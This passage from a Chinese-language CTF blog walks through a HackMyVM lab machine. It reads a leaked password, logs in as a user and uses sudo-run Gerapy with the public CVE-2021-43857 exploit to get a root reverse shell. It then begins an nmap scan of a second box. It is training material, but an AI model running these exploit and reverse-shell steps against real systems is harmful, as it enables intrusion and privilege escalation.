connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.204<span class="token punctuation">]</span> <span class="token number">54388</span>
/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>
$ </code></pre>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@university:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root   root   <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root   root   <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">3</span> sandra sandra <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> sandra</code></pre>
<p>home目录下只有一个用户，没有权限读flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@university:~/html$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x  <span class="token number">3</span> root     root     <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x  <span class="token number">3</span> root     root     <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> www-data www-data   <span class="token number">13</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .sandra_secret
drwxr-xr-x <span class="token number">14</span> www-data www-data <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> university
www-data@university:~/html$ <span class="token function">cat</span> .sandra_secret 
Myyogaiseasy</code></pre>
<p>在html目录找到一个用户<code>sandra</code>的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@university:/home$ <span class="token function">ssh</span> sandra@127.0.0.1
The authenticity of <span class="token function">host</span> <span class="token string">'127.0.0.1 (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:oD2NenwRgDoTOMs/1PwORFFEk2LmxFGe1Xjvz+1ttSo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '</span>/var/www/.ssh<span class="token string">' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
sandra@127.0.0.1'</span>s password: 
Linux university <span class="token number">5.10</span>.0-10-amd64 <span class="token comment">#1 SMP Debian 5.10.84-1 (2021-12-08) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan <span class="token number">18</span> 05:34:35 <span class="token number">2022</span> from <span class="token number">192.168</span>.1.51
sandra@university:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">sandra@university:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-xr-x <span class="token number">3</span> sandra sandra <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root   root   <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> sandra sandra  <span class="token number">220</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> sandra sandra <span class="token number">3526</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .bashrc
drwxr-xr-x <span class="token number">3</span> sandra sandra <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .local
-rw-r--r-- <span class="token number">1</span> sandra sandra  <span class="token number">807</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .profile
-rw------- <span class="token number">1</span> sandra sandra   <span class="token number">20</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> user.txt
-rw------- <span class="token number">1</span> sandra sandra   <span class="token number">56</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .Xauthority
sandra@university:~$ <span class="token function">cat</span> user.txt 
HMV0948328974325HMV</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">sandra@university:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> sandra on university:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User sandra may run the following commands on university:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/local/bin/gerapy</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">sandra@university:~$ gerapy
Usage: gerapy <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-h<span class="token punctuation">]</span>  <span class="token punctuation">..</span>.

Gerapy <span class="token number">0.9</span>.6 - Distributed Crawler Management Framework

Optional arguments:
  -v, <span class="token parameter variable">--version</span>       Get version of Gerapy
  -h, <span class="token parameter variable">--help</span>          Show this <span class="token builtin class-name">help</span> message and <span class="token builtin class-name">exit</span>

Available commands:  
    init              Init workspace, default to gerapy
    initadmin         Create default super user admin
    runserver         Start Gerapy server
    migrate           Migrate database
    createsuperuser   Create a custom superuser
    makemigrations    Generate migrations <span class="token keyword">for</span> database
    generate          Generate Scrapy code <span class="token keyword">for</span> configurable project
    parse             Parse project <span class="token keyword">for</span> debugging
    loaddata          Load data from configs
    dumpdata          Dump data to configs</code></pre>
<p>这是一个分布式爬虫管理框架<br><img src="https://ooo.0x0.ooo/2024/07/21/ORmFcK.png" alt="ORmFcK.png" loading="lazy"><br>搜了一下，发现又存在一个漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> searchsploit gerapy                      
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                             <span class="token operator">|</span>  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gerapy <span class="token number">0.9</span>.7 - Remote Code Execution <span class="token punctuation">(</span>RCE<span class="token punctuation">)</span> <span class="token punctuation">(</span>Authenticated<span class="token punctuation">)</span>                                                                                                                                                                 <span class="token operator">|</span> python/remote/50640.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results</code></pre>
<p>先启动一下服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sandra@university:~$ <span class="token function">su</span> gerapy init
su: user gerapy does not exist or the user entry does not contain all the required fields
sandra@university:~$ <span class="token function">sudo</span> gerapy iniy 
Usage: gerapy <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-h<span class="token punctuation">]</span>  <span class="token punctuation">..</span>.
gerapy: error: argument <span class="token builtin class-name">:</span> invalid choice: <span class="token string">'iniy'</span> <span class="token punctuation">(</span>choose from <span class="token string">'init'</span>, <span class="token string">'initadmin'</span>, <span class="token string">'runserver'</span>, <span class="token string">'migrate'</span>, <span class="token string">'createsuperuser'</span>, <span class="token string">'makemigrations'</span>, <span class="token string">'generate'</span>, <span class="token string">'parse'</span>, <span class="token string">'loaddata'</span>, <span class="token string">'dumpdata'</span><span class="token punctuation">)</span>
sandra@university:~$ <span class="token function">sudo</span> gerapy init
Initialized workspace gerapy
sandra@university:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-xr-x <span class="token number">6</span> sandra sandra <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root   root   <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> sandra sandra  <span class="token number">220</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> sandra sandra <span class="token number">3526</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .bashrc
drwxr-xr-x <span class="token number">2</span> root   root   <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:45 dbs
-rw-r--r-- <span class="token number">1</span> sandra sandra <span class="token number">5310</span> Jul <span class="token number">20</span> <span class="token number">23</span>:47 exp.py
drwxr-xr-x <span class="token number">4</span> root   root   <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 gerapy
drwxr-xr-x <span class="token number">3</span> sandra sandra <span class="token number">4096</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .local
drwxr-xr-x <span class="token number">2</span> sandra sandra <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 logs
-rw-r--r-- <span class="token number">1</span> sandra sandra  <span class="token number">807</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .profile
-rw------- <span class="token number">1</span> sandra sandra   <span class="token number">20</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> user.txt
-rw------- <span class="token number">1</span> sandra sandra   <span class="token number">56</span> Jan <span class="token number">18</span>  <span class="token number">2022</span> .Xauthority
sandra@university:~$ <span class="token builtin class-name">cd</span> gerapy/
sandra@university:~/gerapy$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxr-xr-x <span class="token number">4</span> root   root   <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">6</span> sandra sandra <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 <span class="token punctuation">..</span>
drwxr-xr-x <span class="token number">2</span> root   root   <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 logs
drwxr-xr-x <span class="token number">2</span> root   root   <span class="token number">4096</span> Jul <span class="token number">20</span> <span class="token number">23</span>:50 projects
sandra@university:~/gerapy$ <span class="token function">sudo</span> gerapy migrate
Operations to perform:
  Apply all migrations: admin, auth, authtoken, contenttypes, core, django_apscheduler, sessions
Running migrations:
  Applying contenttypes.0001_initial<span class="token punctuation">..</span>. OK
  Applying auth.0001_initial<span class="token punctuation">..</span>. OK
  Applying admin.0001_initial<span class="token punctuation">..</span>. OK
  Applying admin.0002_logentry_remove_auto_add<span class="token punctuation">..</span>. OK
  Applying admin.0003_logentry_add_action_flag_choices<span class="token punctuation">..</span>. OK
  Applying contenttypes.0002_remove_content_type_name<span class="token punctuation">..</span>. OK
  Applying auth.0002_alter_permission_name_max_length<span class="token punctuation">..</span>. OK
  Applying auth.0003_alter_user_email_max_length<span class="token punctuation">..</span>. OK
  Applying auth.0004_alter_user_username_opts<span class="token punctuation">..</span>. OK
  Applying auth.0005_alter_user_last_login_null<span class="token punctuation">..</span>. OK
  Applying auth.0006_require_contenttypes_0002<span class="token punctuation">..</span>. OK
  Applying auth.0007_alter_validators_add_error_messages<span class="token punctuation">..</span>. OK
  Applying auth.0008_alter_user_username_max_length<span class="token punctuation">..</span>. OK
  Applying auth.0009_alter_user_last_name_max_length<span class="token punctuation">..</span>. OK
  Applying auth.0010_alter_group_name_max_length<span class="token punctuation">..</span>. OK
  Applying auth.0011_update_proxy_permissions<span class="token punctuation">..</span>. OK
  Applying authtoken.0001_initial<span class="token punctuation">..</span>. OK
  Applying authtoken.0002_auto_20160226_1747<span class="token punctuation">..</span>. OK
  Applying authtoken.0003_tokenproxy<span class="token punctuation">..</span>. OK
  Applying core.0001_initial<span class="token punctuation">..</span>. OK
  Applying core.0002_auto_20180119_1210<span class="token punctuation">..</span>. OK
  Applying core.0003_auto_20180123_2304<span class="token punctuation">..</span>. OK
  Applying core.0004_auto_20180124_0032<span class="token punctuation">..</span>. OK
  Applying core.0005_auto_20180131_1210<span class="token punctuation">..</span>. OK
  Applying core.0006_auto_20180131_1235<span class="token punctuation">..</span>. OK
  Applying core.0007_task_trigger<span class="token punctuation">..</span>. OK
  Applying core.0008_auto_20180703_2305<span class="token punctuation">..</span>. OK
  Applying core.0009_auto_20180711_2332<span class="token punctuation">..</span>. OK
  Applying core.0010_auto_20191027_2040<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0001_initial<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0002_auto_20180412_0758<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0003_auto_20200716_1632<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0004_auto_20200717_1043<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0005_migrate_name_to_id<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0006_remove_djangojob_name<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0007_auto_20200717_1404<span class="token punctuation">..</span>. OK
  Applying django_apscheduler.0008_remove_djangojobexecution_started<span class="token punctuation">..</span>. OK
  Applying sessions.0001_initial<span class="token punctuation">..</span>. OK
sandra@university:~/gerapy$ <span class="token function">sudo</span> gerapy createsuperuser
Username <span class="token punctuation">(</span>leave blank to use <span class="token string">'root'</span><span class="token punctuation">)</span>: 
Email address: 
Password: 
Password <span class="token punctuation">(</span>again<span class="token punctuation">)</span>: 
Error: Blank passwords aren<span class="token string">'t allowed.
Password:                                                                                                                                                                           
Password (again): 
This password is too short. It must contain at least 8 characters.
This password is too common.                                                                                                                                                        
This password is entirely numeric.                                                                                                                                                  
Bypass password validation and create user anyway? [y/N]: y                                                                                                                         
Superuser created successfully.
sandra@university:~/gerapy$ sudo gerapy runserver
Watching for file changes with StatReloader
Performing system checks...

System check identified no issues (0 silenced).
July 21, 2024 - 11:51:34
INFO - 2024-07-21 11:51:34,345 - process: 695 - scheduler.py - gerapy.server.core.scheduler - 102 - scheduler - successfully synced task with jobs with force
Django version 2.2.24, using settings '</span>gerapy.server.server.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CONTROL-C.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 <span class="token number">50640</span>.py <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.56.204 <span class="token parameter variable">-p</span> <span class="token number">8000</span> <span class="token parameter variable">-L</span> <span class="token number">192.168</span>.56.104 <span class="token parameter variable">-P</span> <span class="token number">4444</span>
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___<span class="token punctuation">\</span> <span class="token punctuation">\</span>   / / ____<span class="token operator">|</span>   <span class="token operator">|</span>___ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>/ <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">||</span>___ / <span class="token punctuation">(</span> _ <span class="token punctuation">)</span> ___<span class="token operator">|</span>___  <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token operator">|</span>    <span class="token punctuation">\</span> <span class="token punctuation">\</span> / /<span class="token operator">|</span>  _<span class="token operator">|</span> _____ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span>_ <span class="token operator">|</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>  / / 
<span class="token operator">|</span> <span class="token operator">|</span>___  <span class="token punctuation">\</span> V / <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span>_____/ __/<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> / __/<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>__   _<span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>/ /  
 <span class="token punctuation">\</span>____<span class="token operator">|</span>  <span class="token punctuation">\</span>_/  <span class="token operator">|</span>_____<span class="token operator">|</span>   <span class="token operator">|</span>_____<span class="token operator">|</span><span class="token punctuation">\</span>___/_____<span class="token operator">|</span>_<span class="token operator">|</span>        <span class="token operator">|</span>_<span class="token operator">||</span>____/ <span class="token punctuation">\</span>___/____//_/   
                                                                              

Exploit <span class="token keyword">for</span> CVE-2021-43857
For: Gerapy <span class="token operator">&lt;</span> <span class="token number">0.9</span>.8
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Resolving URL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> to application<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Something went wrong<span class="token operator">!</span></code></pre>
<p>0.0<br><img src="https://ooo.0x0.ooo/2024/07/21/ORm7XC.png" alt="ORm7XC.png" loading="lazy"><br>发现exp默认用户和密码是<code>admin:admin</code>,而我创建的是<code>root:123</code>，修改一下<br><img src="https://ooo.0x0.ooo/2024/07/21/ORmezL.png" alt="ORmezL.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 <span class="token number">50640</span>.py <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.56.204 <span class="token parameter variable">-p</span> <span class="token number">8000</span> <span class="token parameter variable">-L</span> <span class="token number">192.168</span>.56.104 <span class="token parameter variable">-P</span> <span class="token number">4444</span>
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___<span class="token punctuation">\</span> <span class="token punctuation">\</span>   / / ____<span class="token operator">|</span>   <span class="token operator">|</span>___ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>/ <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">||</span>___ / <span class="token punctuation">(</span> _ <span class="token punctuation">)</span> ___<span class="token operator">|</span>___  <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token operator">|</span>    <span class="token punctuation">\</span> <span class="token punctuation">\</span> / /<span class="token operator">|</span>  _<span class="token operator">|</span> _____ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span>_ <span class="token operator">|</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>  / / 
<span class="token operator">|</span> <span class="token operator">|</span>___  <span class="token punctuation">\</span> V / <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span>_____/ __/<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> / __/<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>__   _<span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>/ /  
 <span class="token punctuation">\</span>____<span class="token operator">|</span>  <span class="token punctuation">\</span>_/  <span class="token operator">|</span>_____<span class="token operator">|</span>   <span class="token operator">|</span>_____<span class="token operator">|</span><span class="token punctuation">\</span>___/_____<span class="token operator">|</span>_<span class="token operator">|</span>        <span class="token operator">|</span>_<span class="token operator">||</span>____/ <span class="token punctuation">\</span>___/____//_/   
                                                                              

Exploit <span class="token keyword">for</span> CVE-2021-43857
For: Gerapy <span class="token operator">&lt;</span> <span class="token number">0.9</span>.8
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Resolving URL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> to application<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Login successful<span class="token operator">!</span> Proceeding<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting the project list
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span>:
  File <span class="token string">"/root/Desktop/50640.py"</span>, line <span class="token number">130</span>, <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
    exp.exploitation<span class="token punctuation">(</span><span class="token punctuation">)</span>
  File <span class="token string">"/root/Desktop/50640.py"</span>, line <span class="token number">76</span>, <span class="token keyword">in</span> exploitation
    name <span class="token operator">=</span> dict3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
           ~~~~~^^^
IndexError: list index out of range</code></pre>
<p>0.0<br>在getting project list这一步出错<br><img src="https://ooo.0x0.ooo/2024/07/21/ORmrPi.png" alt="ORmrPi.png" loading="lazy"><br>登录一下随便写个项目<br><img src="https://ooo.0x0.ooo/2024/07/21/ORmAlX.png" alt="ORmAlX.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 <span class="token number">50640</span>.py <span class="token parameter variable">-t</span> <span class="token number">192.168</span>.56.204 <span class="token parameter variable">-p</span> <span class="token number">8000</span> <span class="token parameter variable">-L</span> <span class="token number">192.168</span>.56.104 <span class="token parameter variable">-P</span> <span class="token number">4444</span>
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___<span class="token punctuation">\</span> <span class="token punctuation">\</span>   / / ____<span class="token operator">|</span>   <span class="token operator">|</span>___ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>/ <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">||</span>___ / <span class="token punctuation">(</span> _ <span class="token punctuation">)</span> ___<span class="token operator">|</span>___  <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token operator">|</span>    <span class="token punctuation">\</span> <span class="token punctuation">\</span> / /<span class="token operator">|</span>  _<span class="token operator">|</span> _____ __<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span>_ <span class="token operator">|</span>_ <span class="token punctuation">\</span> / _ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span>  / / 
<span class="token operator">|</span> <span class="token operator">|</span>___  <span class="token punctuation">\</span> V / <span class="token operator">|</span> <span class="token operator">|</span>__<span class="token operator">|</span>_____/ __/<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> / __/<span class="token operator">|</span> <span class="token operator">|</span>_____<span class="token operator">|</span>__   _<span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>/ /  
 <span class="token punctuation">\</span>____<span class="token operator">|</span>  <span class="token punctuation">\</span>_/  <span class="token operator">|</span>_____<span class="token operator">|</span>   <span class="token operator">|</span>_____<span class="token operator">|</span><span class="token punctuation">\</span>___/_____<span class="token operator">|</span>_<span class="token operator">|</span>        <span class="token operator">|</span>_<span class="token operator">||</span>____/ <span class="token punctuation">\</span>___/____//_/   
                                                                              

Exploit <span class="token keyword">for</span> CVE-2021-43857
For: Gerapy <span class="token operator">&lt;</span> <span class="token number">0.9</span>.8
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Resolving URL<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> to application<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Login successful<span class="token operator">!</span> Proceeding<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting the project list
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found project: <span class="token number">111</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Getting the ID of the project to build the URL
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found ID of the project:  <span class="token number">1</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up a netcat listener
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4444</span> <span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing reverse shell payload
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Watchout <span class="token keyword">for</span> shell<span class="token operator">!</span> <span class="token builtin class-name">:</span><span class="token punctuation">)</span>
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.204<span class="token punctuation">]</span> <span class="token number">42248</span>
root@university:/home/sandra/gerapy<span class="token comment"># id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@university:/home/sandra/gerapy<span class="token comment"># cat /root/r*</span>
<span class="token function">cat</span> /root/r*
HMV******HMV</code></pre>






]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Online-Admission-System</tag>
        <tag>gerapy</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Aurora</title>
    <url>/posts/7387f134/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.175</strong></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.175 -sV -A -p-</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-18 <span class="token number">19</span>:01 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.175
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00060s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">33</span>:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">3000</span>/tcp <span class="token function">open</span>  http    Node.js Express framework
<span class="token operator">|</span>_http-title: Error
MAC Address: 08:00:27:08:EE:7D <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.61</span> ms <span class="token number">192.168</span>.56.175

